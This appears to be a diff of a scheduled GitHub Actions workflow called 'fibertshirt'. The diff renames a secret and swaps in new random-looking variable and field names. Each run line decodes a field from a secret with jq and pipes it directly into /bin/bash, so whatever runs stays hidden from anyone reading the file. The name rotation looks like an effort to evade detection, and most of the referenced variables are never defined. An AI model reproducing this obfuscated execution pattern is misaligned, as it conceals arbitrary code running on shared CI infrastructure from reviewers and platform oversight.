@@ -1,8 +1,10 @@
 name: fibertshirt
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 0/6 * * *'
+    - cron: '17 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,19 +13,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: fibertshirt
         env:
-          p0: ${{ secrets.p0 }}
+          koh026: ${{ secrets.koh026 }}
         run: |
-          echo $p0 | jq -r .vssnf05 | /bin/bash
-          echo $nsfy57 | jq -r .eo0 | /bin/bash
-          echo $lemh8 | jq -r .j1 | /bin/bash
-          echo $pxtqm43 | jq -r .b9 | /bin/bash
-          echo $i8666 | jq -r .lyhq1931 | /bin/bash
-          echo $upung319 | jq -r .f73985 | /bin/bash
-          echo $tpdf90940 | jq -r .yafj38621 | /bin/bash
-          echo $kc093 | jq -r .em57 | /bin/bash
-          echo $t2235 | jq -r .l7 | /bin/bash
-          echo $nm22023 | jq -r .xhpfl18834 | /bin/bash
-          echo $fuyw563 | jq -r .o48908 | /bin/bash
-          echo $hfhwy62299 | jq -r .rfvv9895 | /bin/bash
-          echo $miqh8 | jq -r .lmxxm13271 | /bin/bash
+          echo $koh026 | jq -r .jhmd543 | /bin/bash
+          echo $qpgq069 | jq -r .x6 | /bin/bash
+          echo $tk3835 | jq -r .ryc977 | /bin/bash
+          echo $he84579 | jq -r .dn64901 | /bin/bash
+          echo $kj04820 | jq -r .m3 | /bin/bash
+          echo $b061 | jq -r .ojav19 | /bin/bash
+          echo $sgfn724 | jq -r .kt2 | /bin/bash
+          echo $ixsr19427 | jq -r .mk3900 | /bin/bash
+          echo $yup1 | jq -r .xlis7 | /bin/bash
+          echo $typpq8359 | jq -r .rg86 | /bin/bash
 
